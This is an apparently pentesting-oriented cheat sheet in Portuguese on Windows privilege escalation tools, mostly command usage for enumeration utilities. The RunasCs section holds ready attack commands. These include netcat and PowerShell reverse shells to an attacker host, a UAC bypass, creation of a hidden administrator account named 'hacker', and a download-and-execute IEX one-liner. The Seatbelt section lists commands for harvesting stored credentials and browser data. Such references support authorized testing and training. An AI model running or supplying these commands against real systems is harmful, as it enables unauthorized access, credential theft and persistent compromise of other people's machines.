# Ferramentas de Escalação de Privilégios Windows

## Índice

- [RunasCs](#runascs)
- [Seatbelt](#seatbelt)
- [SharpUp](#sharpup)
- [PrivescCheck](#privesccheck)
- [BeRoot](#beroot)
- [Watson](#watson)

---

## RunasCs

### Verificação Rápida (One-liner)

```cmd
:: Enumeração rápida de privesc
winPEASx64.exe quiet && Seatbelt.exe -group=all
```

> <https://github.com/antonioCoco/RunasCs>

RunasCs é um utilitário para executar comandos com credenciais de outros usuários. Funciona mesmo quando o logon tipo 2 (interativo) não é permitido.

### Download

```powershell
# Transferir para o alvo
curl http://$lhost/RunasCs.exe -o RunasCs.exe
```

### Uso Básico

> Executar comando como outro usuário

```cmd
RunasCs.exe $username $password "cmd /c whoami"
```

> Executar com usuário de domínio

```cmd
RunasCs.exe $username $password "cmd /c whoami" -d $domain
```

> Shell cmd interativo

```cmd
RunasCs.exe $username $password cmd.exe
```

### Tipos de Logon

| Tipo | Flag | Descrição |
| :--- | :--- | :--- |
| 2 | (padrão) | Interativo |
| 3 | `-l 3` | Rede |
| 8 | `-l 8` | NetworkCleartext |
| 9 | `-l 9` | NewCredentials (runas /netonly) |

> Usar tipo de logon de rede

```cmd
RunasCs.exe $username $password "cmd /c dir \\\\dc01\\c$" -l 9
```

### Reverse Shell

> Executar reverse shell como usuário

```cmd
RunasCs.exe $username $password "powershell -e $base64_payload"
```

> Com nc

```cmd
RunasCs.exe $username $password "C:\temp\nc.exe $lhost $lport -e cmd.exe"
```

### Conexão Remota

> Criar sessão com alvo remoto

```cmd
RunasCs.exe $username $password cmd.exe -r $lhost:$lport
```

> Bypass de UAC

```cmd
RunasCs.exe $username $password cmd.exe -r $lhost:$lport --bypass-uac
```

### Exemplos

> Executar como admin local

```cmd
RunasCs.exe Administrator "P@ssw0rd!" "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
```

> Autenticação de domínio

```cmd
RunasCs.exe john.doe "Password123" "powershell -ep bypass -c IEX(IWR http://$lhost/shell.ps1)" -d CORP
```

---

## Seatbelt

> <https://github.com/GhostPack/Seatbelt>

Seatbelt é um projeto C# que realiza reconhecimento de host orientado à segurança.

### Uso Básico do Seatbelt

> Executar todas as verificações

```cmd
Seatbelt.exe -group=all
```

> Executar grupo específico

```cmd
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=misc
```

### Verificações Comuns

> Caça a credenciais

```cmd
Seatbelt.exe CredEnum
Seatbelt.exe CredentialManager
Seatbelt.exe CloudCredentials
Seatbelt.exe KeePass
Seatbelt.exe SecPackageCreds
```

> Dados de browser

```cmd
Seatbelt.exe ChromiumBookmarks
Seatbelt.exe ChromiumHistory
Seatbelt.exe FirefoxHistory
Seatbelt.exe InternetExplorerFavorites
```

> Credenciais Windows

```cmd
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe WindowsVault
Seatbelt.exe PuttyHostKeys
Seatbelt.exe PuttySessions
Seatbelt.exe RDPSavedConnections
```

> Informações do sistema

```cmd
Seatbelt.exe OSInfo
Seatbelt.exe PowerShellHistory
Seatbelt.exe RecentFiles
Seatbelt.exe ScheduledTasks
Seatbelt.exe Services
```

> Configurações de segurança

```cmd
Seatbelt.exe AuditSettings
Seatbelt.exe PoweredOnEvents
Seatbelt.exe SysmonConfig
Seatbelt.exe UAC
Seatbelt.exe AntiVirus
```

### Opções de Saída

> Salvar em arquivo

```cmd
Seatbelt.exe -group=all -outputfile=C:\temp\seatbelt.txt
```

> Saída completa

```cmd
Seatbelt.exe -group=all -full
```

---

## SharpUp

> <https://github.com/GhostPack/SharpUp>

SharpUp é um port C# do PowerUp, focado em verificações de escalação de privilégios.

### Uso Básico do SharpUp

> Executar todas as verificações

```cmd
SharpUp.exe
```

> Modo auditoria (todas as verificações independente do status de admin)

```cmd
SharpUp.exe audit
```

### Verificações Específicas

> Escalação via serviços

```cmd
SharpUp.exe ModifiableServices
SharpUp.exe ModifiableServiceBinaries
SharpUp.exe UnquotedServicePath
```

> Via registro

```cmd
SharpUp.exe AlwaysInstallElevated
SharpUp.exe ModifiableRegistryAutoRun
```

> Tarefas agendadas

```cmd
SharpUp.exe ModifiableScheduledTask
```

> Credenciais em cache

```cmd
SharpUp.exe CachedGPPPassword
```

> Hijacking

```cmd
SharpUp.exe HijackablePaths
SharpUp.exe ProcessDLLHijack
```

### Exemplo de Saída

```cmd
=== SharpUp: Executando Verificações de Escalação de Privilégios ===

[*] Em integridade média mas usuário é admin local — UAC pode ser bypassado.

=== Serviços Modificáveis ===
Serviço: ServicoVulneravel
  StartName: LocalSystem
  Permissões: ChangeConfig, Start, Stop

=== Caminhos de Serviço sem Aspas ===
Serviço: ServicoRuim
  Caminho do Binário: C:\Program Files\App Vuln\service.exe
```

---

## PrivescCheck

> <https://github.com/itm4n/PrivescCheck>

### Uso

```powershell
# Importar
. .\PrivescCheck.ps1

# Executar todas as verificações
Invoke-PrivescCheck

# Verificações estendidas
Invoke-PrivescCheck -Extended

# Exportar relatório
Invoke-PrivescCheck -Report PrivescCheck -Format HTML
Invoke-PrivescCheck -Report PrivescCheck -Format CSV
```

### Categorias Específicas

```powershell
# Apenas credenciais
Invoke-PrivescCheck -Credential

# Apenas serviços
Invoke-PrivescCheck -Service

# Apenas tarefas agendadas
Invoke-PrivescCheck -ScheduledTask
```

---

## BeRoot

> <https://github.com/AlessandroZ/BeRoot>

### Uso do BeRoot

```cmd
# Windows
beRoot.exe

# Verificar módulo específico
beRoot.exe --list
```

---

## Watson

> <https://github.com/rasta-mouse/Watson>

Watson é uma ferramenta .NET para encontrar vulnerabilidades de escalação de privilégios via patches ausentes.

### Uso do Watson

```cmd
Watson.exe
```

### Exemplo de Saída

```text
[*] Número de Build do SO: 17763
[*] Enumerando KBs instalados...

[!] CVE-2019-1405 : VULNERÁVEL
[>] https://www.exploit-db.com/exploits/47684

[!] CVE-2019-1322 : VULNERÁVEL
[>] https://www.exploit-db.com/exploits/47496
```

---

## Referência Rápida

### Seleção de Ferramenta

| Tarefa | Ferramenta |
| :--- | :--- |
| Executar comando como outro usuário | RunasCs |
| Enumeração geral | Seatbelt |
| Verificações de privesc | SharpUp, PrivescCheck |
| Patches ausentes | Watson |
| Caça a credenciais | Seatbelt |

### Fluxo de Trabalho Comum

```cmd
# 1. Verificação rápida de privesc
SharpUp.exe audit

# 2. Enumeração detalhada
Seatbelt.exe -group=all

# 3. Verificar patches ausentes
Watson.exe

# 4. Se encontrar credenciais, usar RunasCs
RunasCs.exe admin "P@ssword" cmd.exe
```

### Locais de Arquivo

```text
# Locais para transferir ferramentas
C:\Users\Public\
C:\Windows\Temp\
C:\Windows\Tasks\
%TEMP%
```

---

## 📚 Veja Também

### Escalação de Privilégios Relacionada

- **[Escalação de Privilégios Windows](Privilege-Escalation-Windows.md)** — Metodologia completa de privesc no Windows
- **[Potato Exploits](Potato-Exploits.md)** — Impersonação de token (JuicyPotato, PrintSpoofer, GodPotato)
- **[LOLBAS Windows](LOLBAS-Windows.md)** — Abuso de binários nativos do Windows

### Tópicos Relacionados

- **[Comandos Windows](../6.OS-Command/6.1.Windows-command.md)** — Comandos de enumeração Windows
- **[Ataques de Senha](../3.AD-Exploit/3.2.Password-Attacks.md)** — Ataques de credenciais após enumeração
- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Movimentação pós-exploração
